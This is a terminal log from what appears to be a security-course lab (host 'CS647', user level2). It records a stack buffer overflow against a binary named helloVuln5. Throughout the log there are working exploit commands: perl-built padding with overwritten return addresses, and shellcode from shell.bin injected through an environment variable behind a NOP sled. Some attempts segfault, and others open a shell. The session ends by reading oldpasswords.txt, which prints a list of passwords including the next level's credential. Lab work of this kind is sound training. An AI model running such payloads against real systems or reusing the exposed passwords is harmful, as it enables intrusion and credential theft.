  231  ./helloVuln5 $(perl -e 'print "A"x32  . "\xb9\x9d\xbf\xbf"')
  232  ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
  236  ./helloVuln5 $(perl -e 'print "A"x32  . "\xc0\x9d\xbf\xbf"')
  239  ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\xfd\xff\xbf"')
  240  history | grep perl
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\xfd\xff\xbf"')^C
level2@CS647:~/Desktop$ The exploit string as such would be:

Command 'The' not found, did you mean:

  command 'the' from deb the
  command 'he' from deb node-he

Try: apt install <deb name>

level2@CS647:~/Desktop$ 
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x32')$(perl -e 'print "\x32\xff\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2���!
$ exit    
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x31')$(perl -e 'print "\x32\xff\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2���!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x32')$(perl -e 'print "\xb8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x32')$(perl -e 'print "\xc8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ ./helloVuln5 $(perl -e 'print "A"x32  . "\xb8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
$ exit
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x32')$(perl -e 'print "\xc8\xfd\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
Segmentation fault (core dumped)
level2@CS647:~/Desktop$ env -i bob=$(perl -e 'print "\x90"x200')$(cat shell.bin) ./helloVuln5 $(perl -e 'print "A"x32')$(perl -e 'print "\xc8\xff\xff\xbf"')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����!
$ cat oldpasswords.txt
Old passwords:

qwerty123
password2
keyboardwalk
zxcvbnm,asdfghjkl;qwertyuiop
correcthorsebatterystaple
level3password
Giso9l6b5h8R